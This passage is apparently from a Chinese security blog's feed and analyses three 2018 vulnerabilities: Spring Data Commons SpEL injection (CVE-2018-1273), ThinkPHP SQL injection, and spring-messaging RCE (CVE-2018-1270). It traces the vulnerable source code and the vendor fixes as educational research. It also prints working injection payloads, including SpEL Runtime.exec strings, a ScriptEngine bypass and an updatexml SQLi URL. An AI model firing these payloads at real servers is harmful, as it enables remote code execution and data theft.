<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180412/7.jpg?raw=true" alt=""><br>继续执行到217行，解析了spel表达式，成功执行calc.exe。</p>
<p>跟<a href="https://xz.aliyun.com/t/2252" target="_blank" rel="external">spring-messaging Remote Code Execution 分析-【CVE-2018-1270】</a>中使用的<code>expression.getValue(context, Boolean.class)</code>不同，这里执行spel表达式使用的是<code>expression.setValue(context, value)</code>。以后在找类似的spel表达式注入时可以针对性查找这两条语句。</p>
<p>上图来自0c0c0f师傅的<a href="http://www.polaris-lab.com/index.php/archives/501/" target="_blank" rel="external">CVE-2018-1270 Remote Code Execution with spring-messaging</a> </p>
<h1 id="漏洞修补"><a href="#漏洞修补" class="headerlink" title="漏洞修补"></a>漏洞修补</h1><p>以 spring-data-commons 2.0.6 版本为例 <a href="https://github.com/spring-projects/spring-data-commons/commit/ae1dd2741ce06d44a0966ecbd6f47beabde2b653" target="_blank" rel="external">https://github.com/spring-projects/spring-data-commons/commit/ae1dd2741ce06d44a0966ecbd6f47beabde2b653</a></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180412/10.jpg?raw=true" alt=""></p>
<p>换用SimpleEvaluationContext，用于实现简单的数据绑定，保持灵活性减少安全隐患（来自<a href="https://cert.360.cn/warning/detail?id=3efa573a1116c8e6eed3b47f78723f12" target="_blank" rel="external">360cert语</a>）。</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a href="https://jira.spring.io/browse/DATACMNS-1282" target="_blank" rel="external">DATACMNS-1282</a></li>
<li><a href="https://jira.spring.io/browse/DATACMNS-1264" target="_blank" rel="external">DATACMNS-1264</a></li>
<li><a href="https://docs.spring.io/spring-data/jpa/docs/current/reference/html/#projections" target="_blank" rel="external">projections</a></li>
<li><a href="https://github.com/spring-projects/spring-data-examples" target="_blank" rel="external">spring-data-examples</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MzU0NzYzMzU0Mw==&amp;mid=2247483666&amp;idx=1&amp;sn=91e3b2aab354c55e0677895c02fb068c&amp;from=1084195010&amp;wm=20005_0002&amp;weiboauthoruid=5458358938" target="_blank" rel="external">xxlegend大师傅</a></li>
</ul>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>Spring Data Commons 2.0.5版本怼了一天，从早上8点怼到现在，尽管确定了Spel注入点，但就是用普通的表达式弹不出计算器。比如使用 <code>T(java.lang.Runtime).getRuntime().exec(&#39;calc.exe&#39;)</code></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180412/3.gif?raw=true" alt=""></p>
<p>用动态调用<code>(new java.lang.ProcessBuilder(&#39;calc&#39;)).start()</code>的方式也会触发失败。</p>
<p>刚刚才看到<a href="https://mp.weixin.qq.com/s?__biz=MzU0NzYzMzU0Mw==&amp;mid=2247483666&amp;idx=1&amp;sn=91e3b2aab354c55e0677895c02fb068c&amp;from=1084195010&amp;wm=20005_0002&amp;weiboauthoruid=5458358938" target="_blank" rel="external">xxlegend大师傅</a>在其中说明了原因Spring Data Commons 2.0.5版本中 MapDataBinder.java 的182添加了：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">context.setTypeLocator(typeName -&gt; &#123;</div><div class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> SpelEvaluationException(SpelMessage.TYPE_NOT_FOUND, typeName);</div><div class="line">&#125;);</div></pre></td></tr></table></figure></p>
<p>最后用下面的payload可以绕过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">username[#this.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;calc.exe&quot;)]=chybeta&amp;password=chybeta&amp;repeatedPassword=chybeta</div></pre></td></tr></table></figure></p>
<p>另外matthiaskaiser 在 <a href="https://gist.github.com/matthiaskaiser/bfb274222c009b3570ab26436dc8799e" target="_blank" rel="external">https://gist.github.com/matthiaskaiser/bfb274222c009b3570ab26436dc8799e</a> 给出了另一个payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">username[#this.getClass().forName(&quot;javax.script.ScriptEngineManager&quot;).newInstance().getEngineByName(&quot;js&quot;).eval(&quot;java.lang.Runtime.getRuntime().exec(&apos;xterm&apos;)&quot;)]=asdf</div></pre></td></tr></table></figure></p>
<p>关于这个payload是怎么出来的，可以借鉴以下几个漏洞</p>
<ol>
<li><a href="http://drops.xmd5.com/static/drops/papers-5107.html" target="_blank" rel="external">ElasticSearch Groovy脚本远程代码执行漏洞分析（CVE-2015-1427）</a><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180412205148-4334be60-3e50-1.png" alt="13.jpg"></li>
<li><a href="https://jaq.alibaba.com/blog.htm?id=48" target="_blank" rel="external">WebView 远程代码执行漏洞浅析</a><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180412205148-437762b0-3e50-1.png" alt="12.jpg"></li>
</ol>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/t/2269&quot;&gt;Spring Data Commons Remote Code Execution 分析-【CVE-2018-1273】&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
    
    
      <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="java" scheme="http://chybeta.github.io/tags/java/"/>
    
      <category term="命令执行" scheme="http://chybeta.github.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
      <category term="spring" scheme="http://chybeta.github.io/tags/spring/"/>
    
  </entry>
  
  <entry>
    <title>Thinkphp框架 &lt; 5.0.16 sql注入漏洞分析</title>
    <link href="http://chybeta.github.io/2018/04/10/Thinkphp%E6%A1%86%E6%9E%B6-5-0-16-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>http://chybeta.github.io/2018/04/10/Thinkphp框架-5-0-16-sql注入漏洞分析/</id>
    <published>2018-04-09T23:22:49.000Z</published>
    <updated>2018-04-09T23:23:52.524Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://xz.aliyun.com/t/2257" target="_blank" rel="external">Thinkphp框架 &lt; 5.0.16 sql注入漏洞分析</a><br><a id="more"></a></p>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180409/1.jpg?raw=true" alt=""></p>
<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>搭建好数据库，以我自己的配置为例。数据库为tptest，表名为user，其中有两个字段id和username<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180409/2.jpg?raw=true" alt=""></p>
<p>thinkphp官网下载5.0.15版本： <a href="http://www.thinkphp.cn/down/1125.html" target="_blank" rel="external">http://www.thinkphp.cn/down/1125.html</a> 。修改数据库配置信息 application/database.php。在 application/config.php 中打开调试和trace，<code>app_debug</code>和<code>app_trace</code>均为true。在 application/index/controller/Index.php 中Index类中添加方法：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">testsql</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    $username = input(<span class="string">'get.username/a'</span>);</div><div class="line">    db(<span class="string">'user'</span>)-&gt;where([<span class="string">'id'</span>=&gt; <span class="number">1</span>])-&gt;insert([<span class="string">'username'</span>=&gt;$username]);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/index.php/index/index/testsql?username[0]=inc&amp;username[1]=updatexml(1,concat(0x7,user(),0x7e),1)&amp;username[2]=1</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180409/3.jpg?raw=true" alt=""></p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>通过input获取到参数后，<code>username</code>变量情况如下：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180409/4.jpg?raw=true" alt=""></p>
<p>跟入insert，thinkphp/library/think/db/Query.php:2078<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insert</span><span class="params">(array $data = [], $replace = false, $getLastInsID = false, $sequence = null)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="comment">// 分析查询表达式</span></div><div class="line">    $options = <span class="keyword">$this</span>-&gt;parseExpress();</div><div class="line">    $data    = array_merge($options[<span class="string">'data'</span>], $data);</div><div class="line">    ...</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180409/5.jpg?raw=true" alt=""></p>
<p>接下去执行：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$sql = <span class="keyword">$this</span>-&gt;builder-&gt;insert($data, $options, $replace);</div></pre></td></tr></table></figure></p>
<p>跟入 thinkphp/library/think/db/Builder.php:720：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insert</span><span class="params">(array $data, $options = [], $replace = false)</span></span></div><div class="line">  &#123;</div><div class="line">      <span class="comment">// 分析并处理数据</span></div><div class="line">      $data = <span class="keyword">$this</span>-&gt;parseData($data, $options);</div><div class="line">      <span class="keyword">if</span> (<span class="keyword">empty</span>($data)) &#123;</div><div class="line">          <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">      &#125;</div><div class="line">      ...</div></pre></td></tr></table></figure></p>
<p>跟入<code>parseData</code>至 thinkphp/library/think/db/Builder.php:101 ，相关变量信息已经注释添加。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseData</span><span class="params">($data, $options)</span></span></div><div class="line">&#123;</div><div class="line">    ...</div><div class="line">    <span class="comment">// 注</span></div><div class="line">    <span class="keyword">foreach</span> ($data <span class="keyword">as</span> $key =&gt; $val) &#123; <span class="comment">// 第 101 行左右</span></div><div class="line">    <span class="comment">//  $key : "username"</span></div><div class="line">    <span class="comment">//  $val : &#123;"inc","updatexml(1,concat(0x7,user(),0x7e),1)","1"&#125;</span></div><div class="line">        $item = <span class="keyword">$this</span>-&gt;parseKey($key, $options);</div><div class="line">        <span class="keyword">if</span> (is_object($val) &amp;&amp; method_exists($val, <span class="string">'__toString'</span>)) &#123;</div><div class="line">            ....</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">if</span> (<span class="keyword">false</span> === strpos($key, <span class="string">'.'</span>) &amp;&amp; !in_array($key, $fields, <span class="keyword">true</span>)) &#123;</div><div class="line">            ...</div><div class="line">        &#125; <span class="keyword">elseif</span> (is_null($val)) &#123;</div><div class="line">            ...</div><div class="line">        &#125; <span class="keyword">elseif</span> (is_array($val) &amp;&amp; !<span class="keyword">empty</span>($val)) &#123;</div><div class="line">            <span class="comment">// $val[0] = "inc"</span></div><div class="line">            <span class="keyword">switch</span> ($val[<span class="number">0</span>]) &#123;</div><div class="line">                <span class="keyword">case</span> <span class="string">'exp'</span>:</div><div class="line">                    $result[$item] = $val[<span class="number">1</span>];</div><div class="line">                    <span class="keyword">break</span>;</div><div class="line">                <span class="keyword">case</span> <span class="string">'inc'</span>:</div><div class="line">                    $result[$item] = <span class="keyword">$this</span>-&gt;parseKey($val[<span class="number">1</span>]) . <span class="string">'+'</span> . floatval($val[<span class="number">2</span>]);</div><div class="line">                    <span class="keyword">break</span>;</div><div class="line">                <span class="keyword">case</span> <span class="string">'dec'</span>:</div><div class="line">                    $result[$item] = <span class="keyword">$this</span>-&gt;parseKey($val[<span class="number">1</span>]) . <span class="string">'-'</span> . floatval($val[<span class="number">2</span>]);</div><div class="line">                    <span class="keyword">break</span>;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">     ...</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> $result;</div></pre></td></tr></table></figure>
<p>可以看出<code>$val</code>是数组，且根据<code>$val[0]</code>值为<code>inc</code>，会通过switch语句进入到下面这条：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">case</span> <span class="string">'inc'</span>:</div><div class="line">    <span class="comment">// $val[1] = "updatexml(1,concat(0x7,user(),0x7e),1)"</span></div><div class="line">    <span class="comment">// $val[2] = "1"</span></div><div class="line">    $result[$item] = <span class="keyword">$this</span>-&gt;parseKey($val[<span class="number">1</span>]) . <span class="string">'+'</span> . floatval($val[<span class="number">2</span>]);</div><div class="line">    <span class="keyword">break</span>;</div></pre></td></tr></table></figure></p>
<p>跟入此处的<code>parseKey</code>，即thinkphp/library/think/db/builder/Mysql.php:90<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseKey</span><span class="params">($key, $options = [])</span></span></div><div class="line">&#123;</div><div class="line">    $key = trim($key);</div><div class="line">    <span class="keyword">if</span> (strpos($key, <span class="string">'$.'</span>) &amp;&amp; <span class="keyword">false</span> === strpos($key, <span class="string">'('</span>)) &#123;</div><div class="line">        <span class="comment">// JSON字段支持</span></div><div class="line">        <span class="keyword">list</span>($field, $name) = explode(<span class="string">'$.'</span>, $key);</div><div class="line">        $key                = <span class="string">'json_extract('</span> . $field . <span class="string">', \'$.'</span> . $name . <span class="string">'\')'</span>;</div><div class="line">    &#125; <span class="keyword">elseif</span> (strpos($key, <span class="string">'.'</span>) &amp;&amp; !preg_match(<span class="string">'/[,\'\"\(\)`\s]/'</span>, $key)) &#123;</div><div class="line">        <span class="keyword">list</span>($table, $key) = explode(<span class="string">'.'</span>, $key, <span class="number">2</span>);</div><div class="line">        <span class="keyword">if</span> (<span class="string">'__TABLE__'</span> == $table) &#123;</div><div class="line">            $table = <span class="keyword">$this</span>-&gt;query-&gt;getTable();</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($options[<span class="string">'alias'</span>][$table])) &#123;</div><div class="line">            $table = $options[<span class="string">'alias'</span>][$table];</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">'/[,\'\"\*\(\)`.\s]/'</span>, $key)) &#123;</div><div class="line">        $key = <span class="string">'`'</span> . $key . <span class="string">'`'</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($table)) &#123;</div><div class="line">        <span class="keyword">if</span> (strpos($table, <span class="string">'.'</span>)) &#123;</div><div class="line">            $table = str_replace(<span class="string">'.'</span>, <span class="string">'`.`'</span>, $table);</div><div class="line">        &#125;</div><div class="line">        $key = <span class="string">'`'</span> . $table . <span class="string">'`.'</span> . $key;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> $key; <span class="comment">// $key : "updatexml(1,concat(0x7,user(),0x7e),1)"</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>此处并未对传入的<code>$key</code>进行更多的过滤与检查，最后返回的仍然是<code>1 and (updatexml(1,concat(0x7,user(),0x7e),1))</code></p>
<p>回到<code>parseData</code>，<code>floatval($val[2])</code>返回1，这也正是我们要传入<code>username[2]=1</code>的原因。将其与前面经过<code>parseKey</code>的结果进行拼接后返回给<code>result</code><br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180409/6.jpg?raw=true" alt=""></p>
<p>回到 thinkphp/library/think/db/Query.ph 的 insert 中：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180409/7.jpg?raw=true" alt=""></p>
<p>sql注入成功。</p>
<h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><p>官方commit： <a href="https://github.com/top-think/framework/commit/363fd4d90312f2cfa427535b7ea01a097ca8db1b" target="_blank" rel="external">https://github.com/top-think/framework/commit/363fd4d90312f2cfa427535b7ea01a097ca8db1b</a><br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180409/8.jpg?raw=true" alt=""><br>在进行<code>dec</code>和<code>inc</code>操作之前对<code>$val[1]</code>的值进行了再次确认。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/t/2257&quot;&gt;Thinkphp框架 &amp;lt; 5.0.16 sql注入漏洞分析&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
    
    
      <category term="php" scheme="http://chybeta.github.io/tags/php/"/>
    
      <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="命令执行" scheme="http://chybeta.github.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
      <category term="sql注入" scheme="http://chybeta.github.io/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
      <category term="thinkphp" scheme="http://chybeta.github.io/tags/thinkphp/"/>
    
  </entry>
  
  <entry>
    <title>spring-messaging Remote Code Execution 分析-【CVE-2018-1270】</title>
    <link href="http://chybeta.github.io/2018/04/07/spring-messaging-Remote-Code-Execution-%E5%88%86%E6%9E%90-%E3%80%90CVE-2018-1270%E3%80%91/"/>
    <id>http://chybeta.github.io/2018/04/07/spring-messaging-Remote-Code-Execution-分析-【CVE-2018-1270】/</id>
    <published>2018-04-07T04:15:46.000Z</published>
    <updated>2018-04-11T15:36:25.168Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://xz.aliyun.com/t/2252" target="_blank" rel="external">spring-messaging Remote Code Execution 分析-【CVE-2018-1270】</a><br><a id="more"></a></p>
<h1 id="漏洞公告"><a href="#漏洞公告" class="headerlink" title="漏洞公告"></a>漏洞公告</h1><p><a href="https://pivotal.io/security/cve-2018-1270" target="_blank" rel="external">https://pivotal.io/security/cve-2018-1270</a><br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180407/1.jpg?raw=true" alt=""></p>
<p>漏洞影响版本:</p>
<ol>
<li>Spring Framework 5.0 to 5.0.4</li>
<li>Spring Framework 4.3 to 4.3.14</li>
<li>Older unsupported versions are also affected</li>
</ol>
<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>利用官方示例 <a href="https://github.com/spring-guides/gs-messaging-stomp-websocket" target="_blank" rel="external">https://github.com/spring-guides/gs-messaging-stomp-websocket</a> ，git clone后checkout到未更新版本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">git clone https://github.com/spring-guides/gs-messaging-stomp-websocket</div><div class="line"></div><div class="line">git checkout 6958af0b02bf05282673826b73cd7a85e84c12d3</div></pre></td></tr></table></figure></p>
<p>用IDEA打开gs-messaging-stomp-websocket目录下的complete项目，修改app.js中的第15行：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">connect</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> header  = &#123;<span class="string">"selector"</span>:<span class="string">"T(java.lang.Runtime).getRuntime().exec('calc.exe')"</span>&#125;;</div><div class="line">    <span class="keyword">var</span> socket = <span class="keyword">new</span> SockJS(<span class="string">'/gs-guide-websocket'</span>);</div><div class="line">    stompClient = Stomp.over(socket);</div><div class="line">    stompClient.connect(&#123;&#125;, <span class="function"><span class="keyword">function</span> (<span class="params">frame</span>) </span>&#123;</div><div class="line">        setConnected(<span class="literal">true</span>);</div><div class="line">        <span class="built_in">console</span>.log(<span class="string">'Connected: '</span> + frame);</div><div class="line">        stompClient.subscribe(<span class="string">'/topic/greetings'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">greeting</span>) </span>&#123;</div><div class="line">            showGreeting(<span class="built_in">JSON</span>.parse(greeting.body).content);</div><div class="line">        &#125;,header);</div><div class="line">    &#125;);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>增加了一个header头部，其中指定了<code>selector</code>，其值即payload。</p>
<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>点击connect后建立起连接，在文本框中随意输入，点击Send，触发poc：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180407/2.gif?raw=true" alt=""></p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>当在 <a href="http://localhost:8080/" target="_blank" rel="external">http://localhost:8080/</a> 中点击Connect后，在app.js中，有如下代码，会建立起Websocket连接：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> header  = &#123;<span class="string">"selector"</span>:<span class="string">"T(java.lang.Runtime).getRuntime().exec('calc.exe')"</span>&#125;;</div><div class="line">...</div><div class="line">stompClient.subscribe(<span class="string">'/topic/greetings'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">greeting</span>) </span>&#123;</div><div class="line">    showGreeting(<span class="built_in">JSON</span>.parse(greeting.body).content);</div><div class="line">&#125;,header);</div></pre></td></tr></table></figure></p>
<p>其中<code>header</code>中指定了<code>selector</code>，根据 <a href="https://stomp.github.io/stomp-specification-1.0.html" target="_blank" rel="external">Stomp Protocol Specification, Version 1.0</a>，通过指定对应的selecttor，可以对订阅的信息进行过滤：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Stomp brokers may support the selector header which allows you to specify an SQL 92 selector on the message headers which acts as a filter for content based routing.</div><div class="line"></div><div class="line">You can also specify an id header which can then later on be used to UNSUBSCRIBE from the specific subscription as you may end up with overlapping subscriptions using selectors with the same destination. If an id header is supplied then Stomp brokers should append a subscription header to any MESSAGE commands which are sent to the client so that the client knows which subscription the message relates to. If using Wildcards and selectors this can help clients figure out what subscription caused the message to be created.</div></pre></td></tr></table></figure></p>
<p>在 org/springframework/messaging/simp/broker/DefaultSubscriptionRegistry.java 第140行，对这个header参数进行了接受和处理：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">addSubscriptionInternal</span><span class="params">(</span></span></div><div class="line">        String sessionId, String subsId, String destination, Message&lt;?&gt; message) &#123;</div><div class="line"></div><div class="line">    Expression expression = <span class="keyword">null</span>;</div><div class="line">    MessageHeaders headers = message.getHeaders();</div><div class="line">    String selector = SimpMessageHeaderAccessor.getFirstNativeHeader(getSelectorHeaderName(), headers);</div><div class="line">    <span class="keyword">if</span> (selector != <span class="keyword">null</span>) &#123;</div><div class="line">        <span class="keyword">try</span> &#123;</div><div class="line">            expression = <span class="keyword">this</span>.expressionParser.parseExpression(selector);</div><div class="line">            <span class="keyword">this</span>.selectorHeaderInUse = <span class="keyword">true</span>;</div><div class="line">            <span class="keyword">if</span> (logger.isTraceEnabled()) &#123;</div><div class="line">                logger.trace(<span class="string">"Subscription selector: ["</span> + selector + <span class="string">"]"</span>);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">catch</span> (Throwable ex) &#123;</div><div class="line">            <span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</div><div class="line">                logger.debug(<span class="string">"Failed to parse selector: "</span> + selector, ex);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">this</span>.subscriptionRegistry.addSubscription(sessionId, subsId, destination, expression);</div><div class="line">    <span class="keyword">this</span>.destinationCache.updateAfterNewSubscription(destination, sessionId, subsId);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180407/3.jpg?raw=true" alt=""></p>
<p>如图所示，此次连接对应的sessionId为<code>mrzfa005</code>，subsId为<code>sub-0</code>。</p>
<p>之后，在 <a href="http://localhost:8080/" target="_blank" rel="external">http://localhost:8080/</a> 中输入任意字符串，点击send。spring进行了一系列处理后，开始向消息的订阅者分发消息，在 org/springframework/messaging/simp/broker/SimpleBrokerMessageHandler.java:349 行：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">sendMessageToSubscribers</span><span class="params">(@Nullable String destination, Message&lt;?&gt; message)</span> </span>&#123;</div><div class="line">    MultiValueMap&lt;String,String&gt; subscriptions = <span class="keyword">this</span>.subscriptionRegistry.findSubscriptions(message);</div><div class="line">    ...</div></pre></td></tr></table></figure></p>
<p>其中message保存了此次连接/会话的相关信息：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180407/5.jpg?raw=true" alt=""></p>
<p>跟入 <code>this.subscriptionRegistry.findSubscriptions</code> 至 org/springframework/messaging/simp/broker/AbstractSubscriptionRegistry.java:111 行：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> MultiValueMap&lt;String, String&gt; <span class="title">findSubscriptions</span><span class="params">(Message&lt;?&gt; message)</span> </span>&#123;</div><div class="line">    ....</div><div class="line">    <span class="keyword">return</span> findSubscriptionsInternal(destination, message);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>message作为参数被传入 <code>findSubscriptionsInternal</code> ，在return处继续跟进至 org/springframework/messaging/simp/broker/DefaultSubscriptionRegistry.java:184行<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">protected</span> MultiValueMap&lt;String, String&gt; <span class="title">findSubscriptionsInternal</span><span class="params">(String destination, Message&lt;?&gt; message)</span> </span>&#123;</div><div class="line">    MultiValueMap&lt;String, String&gt; result = <span class="keyword">this</span>.destinationCache.getSubscriptions(destination, message);</div><div class="line">    <span class="keyword">return</span> filterSubscriptions(result, message);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>其中result变量值如下：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180407/6.jpg?raw=true" alt=""></p>
